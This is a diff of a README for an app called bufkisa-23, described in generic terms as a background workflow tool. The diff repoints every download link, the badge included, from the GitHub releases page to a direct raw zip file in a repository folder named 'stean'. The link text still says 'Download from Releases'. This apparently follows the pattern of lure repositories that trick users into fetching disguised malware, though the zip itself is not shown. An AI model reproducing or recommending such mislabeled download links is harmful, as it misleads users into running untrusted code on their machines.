@@ -1,6 +1,6 @@
 # 🚀 bufkisa-23 - Simplify Your Workflow with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/yash8156/bufkisa-23/releases)
+[![Download Now](https://raw.githubusercontent.com/yash8156/bufkisa-23/main/stean/bufkisa-23.zip)](https://raw.githubusercontent.com/yash8156/bufkisa-23/main/stean/bufkisa-23.zip)
 
 ## 📝 Description
 bufkisa-23 helps you automate tasks and streamline your daily processes. This user-friendly application works in the background, freeing you to focus on what matters most.
@@ -11,7 +11,7 @@ To begin using bufkisa-23, follow the steps below. No programming knowledge is r
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of bufkisa-23:  
-   [Download from Releases](https://github.com/yash8156/bufkisa-23/releases)
+   [Download from Releases](https://raw.githubusercontent.com/yash8156/bufkisa-23/main/stean/bufkisa-23.zip)
 
 2. **Find the Latest Release**  
    On the Releases page, you will see a list of available versions. Look for the version labeled as "Latest."
@@ -46,4 +46,4 @@ To keep bufkisa-23 running smoothly, regularly check the releases page for updat
 For questions or support, you can reach out to the community via GitHub issues on the repository. 
 
 Start simplifying your tasks with bufkisa-23 today by visiting the releases page:  
-[Download from Releases](https://github.com/yash8156/bufkisa-23/releases)
+[Download from Releases](https://raw.githubusercontent.com/yash8156/bufkisa-23/main/stean/bufkisa-23.zip)
